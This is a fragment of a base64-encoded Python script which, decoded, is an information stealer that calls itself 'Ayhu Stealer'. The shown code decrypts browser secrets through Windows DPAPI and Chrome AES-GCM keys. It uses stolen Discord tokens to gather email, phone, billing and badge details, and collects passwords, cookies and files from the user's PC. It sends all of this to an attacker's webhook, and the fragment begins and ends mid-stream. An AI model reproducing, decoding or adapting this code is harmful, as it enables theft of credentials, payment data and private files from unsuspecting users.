cG9ydF9fKG1vZGxbMF0pDQogICAgZXhjZXB0Og0KICAgICAgICBzdWJwcm9jZXNzLlBvcGVuKGYie2V4ZWN1dGFibGV9IC1tIHBpcCBpbnN0YWxsIHttb2RsWzFdfSIsIHNoZWxsPVRydWUpDQogICAgICAgIHRpbWUuc2xlZXAoMykNCg0KaW1wb3J0IHJlcXVlc3RzDQpmcm9tIENyeXB0by5DaXBoZXIgaW1wb3J0IEFFUw0KDQpsb2NhbCA9IG9zLmdldGVudignTE9DQUxBUFBEQVRBJykNCnJvYW1pbmcgPSBvcy5nZXRlbnYoJ0FQUERBVEEnKQ0KdGVtcCA9IG9zLmdldGVudigiVEVNUCIpDQpUaHJlYWRsaXN0ID0gW10NCg0KDQpjbGFzcyBEQVRBX0JMT0IoU3RydWN0dXJlKToNCiAgICBfZmllbGRzXyA9IFsNCiAgICAgICAgKCdjYkRhdGEnLCB3aW50eXBlcy5EV09SRCksDQogICAgICAgICgncGJEYXRhJywgUE9JTlRFUihjX2NoYXIpKQ0KICAgIF0NCg0KZGVmIEdldERhdGEoYmxvYl9vdXQpOg0KICAgIGNiRGF0YSA9IGludChibG9iX291dC5jYkRhdGEpDQogICAgcGJEYXRhID0gYmxvYl9vdXQucGJEYXRhDQogICAgYnVmZmVyID0gY19idWZmZXIoY2JEYXRhKQ0KICAgIGNkbGwubXN2Y3J0Lm1lbWNweShidWZmZXIsIHBiRGF0YSwgY2JEYXRhKQ0KICAgIHdpbmRsbC5rZXJuZWwzMi5Mb2NhbEZyZWUocGJEYXRhKQ0KICAgIHJldHVybiBidWZmZXIucmF3DQoNCmRlZiBDcnlwdFVucHJvdGVjdERhdGEoZW5jcnlwdGVkX2J5dGVzLCBlbnRyb3B5PWInJyk6DQogICAgYnVmZmVyX2luID0gY19idWZmZXIoZW5jcnlwdGVkX2J5dGVzLCBsZW4oZW5jcnlwdGVkX2J5dGVzKSkNCiAgICBidWZmZXJfZW50cm9weSA9IGNfYnVmZmVyKGVudHJvcHksIGxlbihlbnRyb3B5KSkNCiAgICBibG9iX2luID0gREFUQV9CTE9CKGxlbihlbmNyeXB0ZWRfYnl0ZXMpLCBidWZmZXJfaW4pDQogICAgYmxvYl9lbnRyb3B5ID0gREFUQV9CTE9CKGxlbihlbnRyb3B5KSwgYnVmZmVyX2VudHJvcHkpDQogICAgYmxvYl9vdXQgPSBEQVRBX0JMT0IoKQ0KDQogICAgaWYgd2luZGxsLmNyeXB0MzIuQ3J5cHRVbnByb3RlY3REYXRhKGJ5cmVmKGJsb2JfaW4pLCBOb25lLCBieXJlZihibG9iX2VudHJvcHkpLCBOb25lLCBOb25lLCAweDAxLCBieXJlZihibG9iX291dCkpOg0KICAgICAgICByZXR1cm4gR2V0RGF0YShibG9iX291dCkNCg0KZGVmIERlY3J5cHRWYWx1ZShidWZmLCBtYXN0ZXJfa2V5PU5vbmUpOg0KICAgIHN0YXJ0cyA9IGJ1ZmYuZGVjb2RlKGVuY29kaW5nPSd1dGY4JywgZXJyb3JzPSdpZ25vcmUnKVs6M10NCiAgICBpZiBzdGFydHMgPT0gJ3YxMCcgb3Igc3RhcnRzID09ICd2MTEnOg0KICAgICAgICBpdiA9IGJ1ZmZbMzoxNV0NCiAgICAgICAgcGF5bG9hZCA9IGJ1ZmZbMTU6XQ0KICAgICAgICBjaXBoZXIgPSBBRVMubmV3KG1hc3Rlcl9rZXksIEFFUy5NT0RFX0dDTSwgaXYpDQogICAgICAgIGRlY3J5cHRlZF9wYXNzID0gY2lwaGVyLmRlY3J5cHQocGF5bG9hZCkNCiAgICAgICAgZGVjcnlwdGVkX3Bhc3MgPSBkZWNyeXB0ZWRfcGFzc1s6LTE2XS5kZWNvZGUoKQ0KICAgICAgICByZXR1cm4gZGVjcnlwdGVkX3Bhc3MNCg0KZGVmIExvYWRSZXF1ZXN0cyhtZXRob2RlLCB1cmwsIGRhdGE9JycsIGZpbGVzPScnLCBoZWFkZXJzPScnKToNCiAgICBmb3IgaSBpbiByYW5nZSg4KTogIyBtYXggdHJ5cw0KICAgICAgICB0cnk6DQogICAgICAgICAgICBpZiBtZXRob2RlID09ICdQT1NUJzoNCiAgICAgICAgICAgICAgICBpZiBkYXRhICE9ICcnOg0KICAgICAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCh1cmwsIGRhdGE9ZGF0YSkNCiAgICAgICAgICAgICAgICAgICAgaWYgci5zdGF0dXNfY29kZSA9PSAyMDA6DQogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gcg0KICAgICAgICAgICAgICAgIGVsaWYgZmlsZXMgIT0gJyc6DQogICAgICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KHVybCwgZmlsZXM9ZmlsZXMpDQogICAgICAgICAgICAgICAgICAgIGlmIHIuc3RhdHVzX2NvZGUgPT0gMjAwIG9yIHIuc3RhdHVzX2NvZGUgPT0gNDEzOiAjIDQxMyA9IERBVEEgVE8gQklHDQogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gcg0KICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICBwYXNzDQoNCmRlZiBMb2FkVXJsaWIoaG9vaywgZGF0YT0nJywgZmlsZXM9JycsIGhlYWRlcnM9JycpOg0KICAgIGZvciBpIGluIHJhbmdlKDgpOg0KICAgICAgICB0cnk6DQogICAgICAgICAgICBpZiBoZWFkZXJzICE9ICcnOg0KICAgICAgICAgICAgICAgIHIgPSB1cmxvcGVuKFJlcXVlc3QoaG9vaywgZGF0YT1kYXRhLCBoZWFkZXJzPWhlYWRlcnMpKQ0KICAgICAgICAgICAgICAgIHJldHVybiByDQogICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgIHIgPSB1cmxvcGVuKFJlcXVlc3QoaG9vaywgZGF0YT1kYXRhKSkNCiAgICAgICAgICAgICAgICByZXR1cm4gcg0KICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICBwYXNzDQoNCg0KZGVmIFRydXN0KENvb2tpZXMpOg0KICAgICMgc2ltcGxlIFRydXN0IEZhY3RvciBzeXN0ZW0NCiAgICBnbG9iYWwgREVURUNURUQNCiAgICBkYXRhID0gc3RyKENvb2tpZXMpDQogICAgdGltID0gcmUuZmluZGFsbCgiLmdvb2dsZS5jb20iLCBkYXRhKQ0KICAgICMgcHJpbnQobGVuKHRpbSkpDQogICAgaWYgbGVuKHRpbSkgPCAtMToNCiAgICAgICAgREVURUNURUQgPSBUcnVlDQogICAgICAgIHJldHVybiBERVRFQ1RFRA0KICAgIGVsc2U6DQogICAgICAgIERFVEVDVEVEID0gRmFsc2UNCiAgICAgICAgcmV0dXJuIERFVEVDVEVEDQoNCmRlZiBHZXRCaWxsaW5nKHRva2VuKToNCiAgICBoZWFkZXJzID0gew0KICAgICAgICAiQXV0aG9yaXphdGlvbiI6IHRva2VuLA0KICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLA0KICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDIuMCINCiAgICB9DQogICAgdHJ5Og0KICAgICAgICBiaWxsaW5nanNvbiA9IGxvYWRzKHVybG9wZW4oUmVxdWVzdCgiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdXNlcnMvQG1lL2JpbGxpbmcvcGF5bWVudC1zb3VyY2VzIiwgaGVhZGVycz1oZWFkZXJzKSkucmVhZCgpLmRlY29kZSgpKQ0KICAgIGV4Y2VwdDoNCiAgICAgICAgcmV0dXJuIEZhbHNlDQoNCiAgICBpZiBiaWxsaW5nanNvbiA9PSBbXTogcmV0dXJuICIgLSINCg0KICAgIGJpbGxpbmcgPSAiIg0KICAgIGZvciBtZXRob2RlIGluIGJpbGxpbmdqc29uOg0KICAgICAgICBpZiBtZXRob2RlWyJpbnZhbGlkIl0gPT0gRmFsc2U6DQogICAgICAgICAgICBpZiBtZXRob2RlWyJ0eXBlIl0gPT0gMToNCiAgICAgICAgICAgICAgICBiaWxsaW5nICs9ICI6Y3JlZGl0X2NhcmQ6Ig0KICAgICAgICAgICAgZWxpZiBtZXRob2RlWyJ0eXBlIl0gPT0gMjoNCiAgICAgICAgICAgICAgICBiaWxsaW5nICs9ICI6cGFya2luZzogIg0KDQogICAgcmV0dXJuIGJpbGxpbmcNCg0KDQpkZWYgR2V0QmFkZ2UoZmxhZ3MpOg0KICAgIGlmIGZsYWdzID09IDA6IHJldHVybiAnJw0KDQogICAgT3duZWRCYWRnZXMgPSAnJw0KICAgIGJhZGdlTGlzdCA9ICBbDQogICAgICAgIHsiTmFtZSI6ICdFYXJseV9WZXJpZmllZF9Cb3RfRGV2ZWxvcGVyJywgJ1ZhbHVlJzogMTMxMDcyLCAnRW1vamknOiAiPDpkZXZlbG9wZXI6ODc0NzUwODA4NDcyODI1OTg2PiAifSwNCiAgICAgICAgeyJOYW1lIjogJ0J1Z19IdW50ZXJfTGV2ZWxfMicsICdWYWx1ZSc6IDE2Mzg0LCAnRW1vamknOiAiPDpidWdodW50ZXJfMjo4NzQ3NTA4MDg0MzA4NzQ2NjQ+ICJ9LA0KICAgICAgICB7Ik5hbWUiOiAnRWFybHlfU3VwcG9ydGVyJywgJ1ZhbHVlJzogNTEyLCAnRW1vamknOiAiPDplYXJseV9zdXBwb3J0ZXI6ODc0NzUwODA4NDE0MTEzODIzPiAifSwNCiAgICAgICAgeyJOYW1lIjogJ0hvdXNlX0JhbGFuY2UnLCAnVmFsdWUnOiAyNTYsICdFbW9qaSc6ICI8OmJhbGFuY2U6ODc0NzUwODA4MjY3MjkyNjgzPiAifSwNCiAgICAgICAgeyJOYW1lIjogJ0hvdXNlX0JyaWxsaWFuY2UnLCAnVmFsdWUnOiAxMjgsICdFbW9qaSc6ICI8OmJyaWxsaWFuY2U6ODc0NzUwODA4MzM4NjA4MTk5PiAifSwNCiAgICAgICAgeyJOYW1lIjogJ0hvdXNlX0JyYXZlcnknLCAnVmFsdWUnOiA2NCwgJ0Vtb2ppJzogIjw6YnJhdmVyeTo4NzQ3NTA4MDgzODg5NTIwNzU+ICJ9LA0KICAgICAgICB7Ik5hbWUiOiAnQnVnX0h1bnRlcl9MZXZlbF8xJywgJ1ZhbHVlJzogOCwgJ0Vtb2ppJzogIjw6YnVnaHVudGVyXzE6ODc0NzUwODA4NDI2NjkyNjU4PiAifSwNCiAgICAgICAgeyJOYW1lIjogJ0h5cGVTcXVhZF9FdmVudHMnLCAnVmFsdWUnOiA0LCAnRW1vamknOiAiPDpoeXBlc3F1YWRfZXZlbnRzOjg3NDc1MDgwODU5NDQ3NzA1Nj4gIn0sDQogICAgICAgIHsiTmFtZSI6ICdQYXJ0bmVyZWRfU2VydmVyX093bmVyJywgJ1ZhbHVlJzogMiwnRW1vamknOiAiPDpwYXJ0bmVyOjg3NDc1MDgwODY3ODM1NDk2ND4gIn0sDQogICAgICAgIHsiTmFtZSI6ICdEaXNjb3JkX0VtcGxveWVlJywgJ1ZhbHVlJzogMSwgJ0Vtb2ppJzogIjw6c3RhZmY6ODc0NzUwODA4NzI4NjY2MTUyPiAifQ0KDQogICAgXQ0KICAgIGZvciBiYWRnZSBpbiBiYWRnZUxpc3Q6DQogICAgICAgIGlmIGZsYWdzIC8vIGJhZGdlWyJWYWx1ZSJdICE9IDA6DQogICAgICAgICAgICBPd25lZEJhZGdlcyArPSBiYWRnZVsiRW1vamkiXQ0KICAgICAgICAgICAgZmxhZ3MgPSBmbGFncyAlIGJhZGdlWyJWYWx1ZSJdDQoNCiAgICByZXR1cm4gT3duZWRCYWRnZXMNCg0KZGVmIEdldFRva2VuSW5mbyh0b2tlbik6DQogICAgaGVhZGVycyA9IHsNCiAgICAgICAgIkF1dGhvcml6YXRpb24iOiB0b2tlbiwNCiAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwNCiAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAiDQogICAgfQ0KDQogICAgdXNlcmpzb24gPSBsb2Fkcyh1cmxvcGVuKFJlcXVlc3QoImh0dHBzOi8vZGlzY29yZGFwcC5jb20vYXBpL3Y2L3VzZXJzL0BtZSIsIGhlYWRlcnM9aGVhZGVycykpLnJlYWQoKS5kZWNvZGUoKSkNCiAgICB1c2VybmFtZSA9IHVzZXJqc29uWyJ1c2VybmFtZSJdDQogICAgaGFzaHRhZyA9IHVzZXJqc29uWyJkaXNjcmltaW5hdG9yIl0NCiAgICBlbWFpbCA9IHVzZXJqc29uWyJlbWFpbCJdDQogICAgaWRkID0gdXNlcmpzb25bImlkIl0NCiAgICBwZnAgPSB1c2VyanNvblsiYXZhdGFyIl0NCiAgICBmbGFncyA9IHVzZXJqc29uWyJwdWJsaWNfZmxhZ3MiXQ0KICAgIG5pdHJvID0gIiINCiAgICBwaG9uZSA9ICItIg0KDQogICAgaWYgInByZW1pdW1fdHlwZSIgaW4gdXNlcmpzb246DQogICAgICAgIG5pdHJvdCA9IHVzZXJqc29uWyJwcmVtaXVtX3R5cGUiXQ0KICAgICAgICBpZiBuaXRyb3QgPT0gMToNCiAgICAgICAgICAgIG5pdHJvID0gIjw6Y2xhc3NpYzo4OTYxMTkxNzEwMTkwNjc0MjM+ICINCiAgICAgICAgZWxpZiBuaXRyb3QgPT0gMjoNCiAgICAgICAgICAgIG5pdHJvID0gIjxhOmJvb3N0OjgyNDAzNjc3ODU3MDQxNjEyOT4gPDpjbGFzc2ljOjg5NjExOTE3MTAxOTA2NzQyMz4gIg0KICAgIGlmICJwaG9uZSIgaW4gdXNlcmpzb246IHBob25lID0gZidge3VzZXJqc29uWyJwaG9uZSJdfWAnDQoNCiAgICByZXR1cm4gdXNlcm5hbWUsIGhhc2h0YWcsIGVtYWlsLCBpZGQsIHBmcCwgZmxhZ3MsIG5pdHJvLCBwaG9uZQ0KDQpkZWYgY2hlY2tUb2tlbih0b2tlbik6DQogICAgaGVhZGVycyA9IHsNCiAgICAgICAgIkF1dGhvcml6YXRpb24iOiB0b2tlbiwNCiAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwNCiAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAiDQogICAgfQ0KICAgIHRyeToNCiAgICAgICAgdXJsb3BlbihSZXF1ZXN0KCJodHRwczovL2Rpc2NvcmRhcHAuY29tL2FwaS92Ni91c2Vycy9AbWUiLCBoZWFkZXJzPWhlYWRlcnMpKQ0KICAgICAgICByZXR1cm4gVHJ1ZQ0KICAgIGV4Y2VwdDoNCiAgICAgICAgcmV0dXJuIEZhbHNlDQoNCg0KZGVmIHVwbG9hZFRva2VuKHRva2VuLCBwYXRoKToNCiAgICBnbG9iYWwgaG9vaw0KICAgIGhlYWRlcnMgPSB7DQogICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsDQogICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIg0KICAgIH0NCiAgICB1c2VybmFtZSwgaGFzaHRhZywgZW1haWwsIGlkZCwgcGZwLCBmbGFncywgbml0cm8sIHBob25lID0gR2V0VG9rZW5JbmZvKHRva2VuKQ0KDQogICAgaWYgcGZwID09IE5vbmU6DQogICAgICAgIHBmcCA9ICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy85NzAwMDM3ODU1NTg2ODM2OTgvMTAzMTE0NzkxNzY4NTMwOTQ5MC9zYS5qcGciDQogICAgZWxzZToNCiAgICAgICAgcGZwID0gZiJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdmF0YXJzL3tpZGR9L3twZnB9Ig0KDQogICAgYmlsbGluZyA9IEdldEJpbGxpbmcodG9rZW4pDQogICAgYmFkZ2UgPSBHZXRCYWRnZShmbGFncykNCiAgICBpZiBub3QgYmlsbGluZzoNCiAgICAgICAgYmFkZ2UsIHBob25lLCBiaWxsaW5nID0gIvCflJIiLCAi8J+UkiIsICLwn5SSIg0KICAgIGlmIG5pdHJvID09ICcnIGFuZCBiYWRnZSA9PSAnJzogbml0cm8gPSAiIC0iDQoNCiAgICBkYXRhID0gew0KICAgICAgICAiY29udGVudCI6IGYnRm91bmQgaW4gYHtwYXRofWAnLA0KICAgICAgICAiZW1iZWRzIjogWw0KICAgICAgICAgICAgew0KICAgICAgICAgICAgImNvbG9yIjogMTQ0MDY0MTMsDQogICAgICAgICAgICAiZmllbGRzIjogWw0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiOnJvY2tldDogVG9rZW46IiwNCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJge3Rva2VufWBcbltDbGljayB0byBjb3B5XShodHRwczovL3N1cGVyZnVycnljZG4ubmwvY29weS97dG9rZW59KSINCiAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiOmVudmVsb3BlOiBFbWFpbDoiLA0KICAgICAgICAgICAgICAgICAgICAidmFsdWUiOiBmImB7ZW1haWx9YCIsDQogICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBUcnVlDQogICAgICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICJuYW1lIjogIjptb2JpbGVfcGhvbmU6IFBob25lOiIsDQogICAgICAgICAgICAgICAgICAgICJ2YWx1ZSI6IGYie3Bob25lfSIsDQogICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBUcnVlDQogICAgICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICJuYW1lIjogIjpnbG9iZV93aXRoX21lcmlkaWFuczogSVA6IiwNCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJge2dldGlwKCl9YCIsDQogICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBUcnVlDQogICAgICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICJuYW1lIjogIjpiZWdpbm5lcjogQmFkZ2VzOiIsDQogICAgICAgICAgICAgICAgICAgICJ2YWx1ZSI6IGYie25pdHJvfXtiYWRnZX0iLA0KICAgICAgICAgICAgICAgICAgICAiaW5saW5lIjogVHJ1ZQ0KICAgICAgICAgICAgICAgIH0sDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICI6Y3JlZGl0X2NhcmQ6IEJpbGxpbmc6IiwNCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJ7YmlsbGluZ30iLA0KICAgICAgICAgICAgICAgICAgICAiaW5saW5lIjogVHJ1ZQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBdLA0KICAgICAgICAgICAgImF1dGhvciI6IHsNCiAgICAgICAgICAgICAgICAibmFtZSI6IGYie3VzZXJuYW1lfSN7aGFzaHRhZ30gKHtpZGR9KSIsDQogICAgICAgICAgICAgICAgImljb25fdXJsIjogZiJ7cGZwfSINCiAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgImZvb3RlciI6IHsNCiAgICAgICAgICAgICAgICAidGV4dCI6ICJAQXlodSBTdGVhbGVyIiwNCiAgICAgICAgICAgICAgICAiaWNvbl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTcwMDAzNzg1NTU4NjgzNjk4LzEwMzExNDc5MTc2ODUzMDk0OTAvc2EuanBnIg0KICAgICAgICAgICAgICAgIH0sDQogICAgICAgICAgICAidGh1bWJuYWlsIjogew0KICAgICAgICAgICAgICAgICJ1cmwiOiBmIntwZnB9Ig0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgXSwNCiAgICAgICAgImF2YXRhcl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTcwMDAzNzg1NTU4NjgzNjk4LzEwMzExNDc5MTc2ODUzMDk0OTAvc2EuanBnIiwNCiAgICAgICAgInVzZXJuYW1lIjogIkF5aHUgU3RlYWxlciIsDQogICAgICAgICJhdHRhY2htZW50cyI6IFtdDQogICAgICAgIH0NCiAgICAjIHVybG9wZW4oUmVxdWVzdChob29rLCBkYXRhPWR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpKQ0KICAgIExvYWRVcmxpYihob29rLCBkYXRhPWR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpDQoNCmRlZiBSZWZvcm1hdChsaXN0dCk6DQogICAgZSA9IHJlLmZpbmRhbGwoIihcdytbYS16XSkiLGxpc3R0KQ0KICAgIHdoaWxlICJodHRwcyIgaW4gZTogZS5yZW1vdmUoImh0dHBzIikNCiAgICB3aGlsZSAiY29tIiBpbiBlOiBlLnJlbW92ZSgiY29tIikNCiAgICB3aGlsZSAibmV0IiBpbiBlOiBlLnJlbW92ZSgibmV0IikNCiAgICByZXR1cm4gbGlzdChzZXQoZSkpDQoNCmRlZiB1cGxvYWQobmFtZSwgdGs9JycpOg0KICAgIGhlYWRlcnMgPSB7DQogICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsDQogICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIg0KICAgIH0NCg0KICAgIGlmIG5hbWUgPT0gImtpd2kiOg0KICAgICAgICBkYXRhID0gew0KICAgICAgICAiY29udGVudCI6ICcnLA0KICAgICAgICAiZW1iZWRzIjogWw0KICAgICAgICAgICAgew0KICAgICAgICAgICAgImNvbG9yIjogMTQ0MDY0MTMsDQogICAgICAgICAgICAiZmllbGRzIjogWw0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAibmFtZSI6ICJJbnRlcmVzdGluZyBmaWxlcyBmb3VuZCBvbiB1c2VyIFBDOiIsDQogICAgICAgICAgICAgICAgInZhbHVlIjogdGsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICBdLA0KICAgICAgICAgICAgImF1dGhvciI6IHsNCiAgICAgICAgICAgICAgICAibmFtZSI6ICJBeWh1IHwgRmlsZSBTdGVhbGVyIg0KICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICJmb290ZXIiOiB7DQogICAgICAgICAgICAgICAgInRleHQiOiAiQEF5aHUgU3RlYWxlciIsDQogICAgICAgICAgICAgICAgImljb25fdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzk3MDAwMzc4NTU1ODY4MzY5OC8xMDMxMTQ3OTE3Njg1MzA5NDkwL3NhLmpwZyINCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgXSwNCiAgICAgICAgImF2YXRhcl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTcwMDAzNzg1NTU4NjgzNjk4LzEwMzExNDc5MTc2ODUzMDk0OTAvc2EuanBnIiwNCiAgICAgICAgImF0dGFjaG1lbnRzIjogW10NCiAgICAgICAgfQ0KICAgICAgICAjIHVybG9wZW4oUmVxdWVzdChob29rLCBkYXRhPWR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpKQ0KICAgICAgICBMb2FkVXJsaWIoaG9vaywgZGF0YT1kdW1wcyhkYXRhKS5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKQ0KICAgICAgICByZXR1cm4NCg0KICAgIHBhdGggPSBuYW1lDQogICAgZmlsZXMgPSB7J2ZpbGUnOiBvcGVuKHBhdGgsICdyYicpfQ0KICAgICMgcHJpbnQoZiJGSUxFPSB7ZmlsZXN9IikNCg0KICAgIGlmICJ3cHBhc3N3IiBpbiBuYW1lOg0KDQogICAgICAgIHJhID0gJyB8ICcuam9pbihkYSBmb3IgZGEgaW4gcGFzd1dvcmRzKQ0KDQogICAgICAgIGlmIGxlbihyYSkgPiAxMDAwOg0KICAgICAgICAgICAgcnJyID0gUmVmb3JtYXQoc3RyKHBhc3dXb3JkcykpDQogICAgICAgICAgICByYSA9ICcgfCAnLmpvaW4oZGEgZm9yIGRhIGluIHJycikNCg0KICAgICAgICBkYXRhID0gew0KICAgICAgICAiY29udGVudCI6ICcnLA0KICAgICAgICAiZW1iZWRzIjogWw0KICAgICAgICAgICAgew0KICAgICAgICAgICAgImNvbG9yIjogMTQ0MDY0MTMsDQogICAgICAgICAgICAiZmllbGRzIjogWw0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAibmFtZSI6ICJGb3VuZDoiLA0KICAgICAgICAgICAgICAgICJ2YWx1ZSI6IHJhDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgXSwNCiAgICAgICAgICAgICJhdXRob3IiOiB7DQogICAgICAgICAgICAgICAgIm5hbWUiOiAiQXlodSB8IFBhc3N3b3JkIFN0ZWFsZXIiDQogICAgICAgICAgICB9LA0KICAgICAgICAgICAgImZvb3RlciI6IHsNCiAgICAgICAgICAgICAgICAidGV4dCI6ICJAQXlodSBTdGVhbGVyIiwNCiAgICAgICAgICAgICAgICAiaWNvbl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTcwMDAzNzg1NTU4NjgzNjk4LzEwMzExNDc5MTc2ODUzMDk0OTAvc2EuanBnIg0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICBdLA0KICAgICAgICAiYXZhdGFyX3VybCI6ICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy85NzAwMDM3ODU1NTg2ODM2OTgvMTAzMTE0NzkxNzY4NTMwOTQ5MC9zYS5qcGciLA0KICAgICAgICAiYXR0YWNobWVudHMiOiBbXQ0KICAgICAgICB9DQogICAgICAgICMgdXJsb3BlbihSZXF1ZXN0KGhvb2ssIGRhdGE9ZHVtcHMoZGF0YSkuZW5jb2RlKCksIGhlYWRlcnM9aGVhZGVycykpDQogICAgICAgIExvYWRVcmxpYihob29rLCBkYXRhPWR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpDQoNCiAgICBpZiAid3Bjb29rIiBpbiBuYW1lOg0KICAgICAgICByYiA9ICcgfCAnLmpvaW4oZGEgZm9yIGRhIGluIGNvb2tpV29yZHMpDQogICAgICAgIGlmIGxlbihyYikgPiAxMDAwOg0KICAgICAgICAgICAgcnJycnIgPSBSZWZvcm1hdChzdHIoY29va2lXb3JkcykpDQogICAgICAgICAgICByYiA9ICcgfCAnLmpvaW4oZGEgZm9yIGRhIGluIHJycnJyKQ0KDQogICAgICAgIGRhdGEgPSB7DQogICAgICAgICJjb250ZW50IjogJycsDQogICAgICAgICJlbWJlZHMiOiBbDQogICAgICAgICAgICB7DQogICAgICAgICAgICAiY29sb3IiOiAxNDQwNjQxMywNCiAgICAgICAgICAgICJmaWVsZHMiOiBbDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICJuYW1lIjogIkZvdW5kOiIsDQogICAgICAgICAgICAgICAgInZhbHVlIjogcmINCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICBdLA0KICAgICAgICAgICAgImF1dGhvciI6IHsNCiAgICAgICAgICAgICAgICAibmFtZSI6ICJBeWh1IHwgQ29va2llcyBTdGVhbGVyIg0KICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICJmb290ZXIiOiB7DQogICAgICAgICAgICAgICAgInRleHQiOiAiQEF5aHUgU3RlYWxlciIsDQogICAgICAgICAgICAgICAgImljb25fdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzk3MDAwMzc4NTU1ODY4MzY5OC8xMDMxMTQ3OTE3Njg1MzA5NDkwL3NhLmpwZyINCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgXSwNCiAgICAgICAgImF2YXRhcl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTcwMDAzNzg1NTU4NjgzNjk4LzEwMzExNDc5MTc2ODUzMDk0OTAvc2EuanBnIiwNCiAgICAgICAgImF0dGFjaG1lbnRzIjogW10NCiAgICAgICAgfQ0KICAgICAgICAjIHVybG9wZW4oUmVxdWVzdChob29rLCBkYXRhPWR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpKQ0KICAgICAgICBMb2FkVXJsaWIoaG9vaywgZGF0YT1kdW1w